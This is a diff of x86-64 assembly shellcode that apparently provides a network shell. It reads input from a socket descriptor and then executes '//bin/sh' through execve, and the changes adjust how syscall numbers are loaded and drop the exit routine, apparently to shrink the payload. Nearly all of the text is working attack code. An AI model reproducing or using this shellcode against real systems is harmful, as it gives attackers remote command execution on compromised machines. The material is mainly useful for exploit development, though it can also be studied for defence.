@@ -89,8 +89,7 @@ close:
 read:
         ;; read(sockfd2, void *buf, 8)
         pop     rdi                     ; load back sockfd2
-        push    SYS_READ
-        pop     rax                     ; rdx = 0x10, 16 bytes to read
+        xor     rax, rax                ; rdx = 0x10, 16 bytes to read
         push    rsp                     ; rsp still points to sockaddr 16 bytes
         pop     rsi                     ; so use it as *buf
         syscall
@@ -121,10 +120,8 @@ execve:
         mov     rdi, '//bin/sh'
         push    rdi
         mov     rdi, rsp
-        xor     rax, rax                ; __NR_execve 0
+        push    SYS_EXECVE
+        pop     rax
         syscall
 
 quit:
-        push    SYS_EXIT
-        xor     rdi, rdi
-        syscall
